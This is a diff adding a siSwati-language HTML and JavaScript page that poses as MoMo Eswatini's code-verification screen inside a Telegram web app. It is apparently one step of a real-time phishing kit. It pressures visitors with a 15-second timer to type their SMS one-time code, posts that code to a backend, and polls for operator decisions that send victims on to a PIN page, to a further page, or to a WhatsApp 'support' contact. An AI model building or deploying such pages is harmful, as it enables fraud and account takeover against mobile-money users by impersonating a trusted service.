@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="ss">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MoMo Eswatini - Kucinisekisa</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --momo-yellow: #ffcc00;
+            --momo-gradient: linear-gradient(180deg, #ffcc00 0%, #e6b800 100%);
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-momo: #ffcc00;
+            --notice-bg: #fffdf0;
+            --notice-border: #ffcc00;
+            --notice-text: #856404;
+            --btn-disabled-bg: #e0e0e0;
+            --btn-disabled-text: #999999;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        .header-box {
+            width: 100%;
+            background: var(--momo-gradient);
+            padding: 25px 20px 40px 20px;
+            color: #000000;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: -20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            align-self: flex-start;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 24px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 16px 0;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* Notice Warning Box */
+        .notice-box {
+            background-color: var(--notice-bg);
+            border: 1.5px solid var(--notice-border);
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+            font-size: 13.5px;
+            color: var(--notice-text);
+            font-weight: 700;
+            line-height: 1.4;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-align: left;
+        }
+
+        .notice-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        /* Phone Input Display */
+        .phone-container {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #cccccc;
+            border-radius: 10px;
+            background-color: #fffdf0;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .phone-prefix {
+            background-color: var(--momo-yellow);
+            color: #000000;
+            font-weight: 800;
+            padding: 14px 16px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .phone-number {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            padding: 14px 16px;
+        }
+
+        .field-label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+            display: block;
+            text-align: center;
+        }
+
+        /* 4-Digit Code Box Grid */
+        .pin-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .pin-input-group { 
+            display: flex; 
+            gap: 12px; 
+        }
+
+        .pin-box {
+            width: 58px;
+            height: 58px;
+            border: 1.5px solid #cccccc;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+        }
+
+        .pin-box:focus {
+            border-color: #000000;
+            border-width: 2px;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+
+        .submit-btn.active {
+            background: var(--momo-gradient);
+            color: #000000;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            opacity: 0.95;
+        }
+
+        .footer-banner {
+            width: 100%;
+            background: var(--momo-gradient);
+            height: 80px;
+            border-top-left-radius: 50% 30px;
+            border-top-right-radius: 50% 30px;
+            margin-top: 40px;
+        }
+
+        /* Fullsize Screen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            min-height: 100vh;
+            background: var(--momo-gradient);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: #000000;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(0, 0, 0, 0.2);
+            border-top: 5px solid #000000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: #000000;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #222222;
+            line-height: 1.4;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: #000000;
+            color: var(--momo-yellow);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="header-box">
+    MoMo Eswatini
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Qinisekisa Ikhodi</h2>
+
+        <p class="instruction">
+            Sicela ufake ikhodi yokuqinisekisa yetingcingo leti-4 letfolwe ku-SMS ngezansi.
+        </p>
+
+        <!-- Dynamic Notice Box -->
+        <div class="notice-box">
+            <span class="notice-icon">⚠️</span>
+            <div>
+                Lekhodi iphelelwa sikhatsi nga <span id="timer">15</span> tsite. Sicela uyithumele ngekushesha.
+            </div>
+        </div>
+
+        <!-- Phone Display Block -->
+        <div class="phone-container">
+            <div class="phone-prefix">
+                <span>🇸🇿</span>
+                <span>+268</span>
+            </div>
+            <div class="phone-number" id="displayPhone">
+                ...
+            </div>
+        </div>
+
+        <label class="field-label">Faka Ikhodi Yeshekeleti (Leti-4)</label>
+        
+        <!-- 4-Digit Code Input Group -->
+        <div class="pin-wrapper">
+            <div class="pin-input-group">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            </div>
+        </div>
+        
+        <div id="errorText" class="error-message">Ikhodi ayilungile noma iphelelwe sikhatsi, sicela usebentise lekhodi yakamuva.</div>
+
+        <div class="resend-text" id="timerBox">
+            Phindza uthumele nge <span id="timerSub">15</span> tsite
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>QINISEKISA IKHODI</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- Loading Overlay -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Sicela ulindze...</div>
+    </div>
+</div>
+
+<!-- WhatsApp Support Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Chumana natsi ku-WhatsApp</div>
+        <div class="overlay-desc">Cindezela lesitifiketi ngezansi kute uchumane nekusekela ku-WhatsApp</div>
+        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">
+            https://wa.me/message/ICY6YKSAAG3GC1
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerSubEl = document.getElementById('timerSub');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Load stored Eswatini phone number
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    if (savedPhone) {
+        displayPhone.textContent = savedPhone.replace(/^\+?268/, '');
+    } else {
+        displayPhone.textContent = "76123456";
+    }
+
+    // Handle 4-digit input boxes progression and backspace
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+            errorText.style.display = 'none';
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        submitBtn.disabled = !filled;
+        submitBtn.classList.toggle('active', filled);
+    }
+
+    // 15 seconds countdown timer
+    let timeLeft = 15;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+        if (timerSubEl) timerSubEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:#b28600; cursor:pointer; font-weight:700;" onclick="location.reload()">Phindza Uthumele Ikhodi</span>';
+        }
+    }, 1000);
+
+    // Poll status from API
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                // Proceed to page 9
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                // Wrong PIN -> back to page 6
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                // Incorrect OTP Code
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "Ikhodi ayilungile noma iphelelwe sikhatsi, sicela usebentise lekhodi yakamuva.";
+                    errorText.style.display = "block";
+                    pinBoxes.forEach(b => b.value = "");
+                    pinBoxes[0].focus();
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } 
+                // Contact support overlay
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Status check error:", err);
+            }
+        }, 2000);
+    }
+
+    // Submission handler
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        let code = "";
+        pinBoxes.forEach(b => code += b.value);
+        if (code.length !== 4) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: code // Maintained backend parameter mapping
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Iphutha ekutfumeleni sicelo.");
+            }
+        } catch (err) {
+            console.error("Submission error:", err);
+            statusOverlay.style.display = "none";
+            alert("Iphutha lokuxhumana.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
